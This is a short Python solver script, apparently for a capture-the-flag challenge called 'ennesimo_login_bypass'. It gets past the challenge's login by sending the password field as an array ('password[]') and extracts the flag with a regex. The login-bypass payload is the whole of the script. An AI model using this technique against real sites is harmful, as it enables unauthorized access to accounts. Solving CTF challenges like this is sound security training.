#!/usr/bin/env python3
import requests, re

SITE = "http://ennesimo_login_bypass.challs.olicyber.it/"
REGEX = r"flag{.*?}"

r = requests.post(SITE, data={"password[]":"dammiLaFlag"})
flag = re.findall(REGEX, r.text)[0]
print(flag)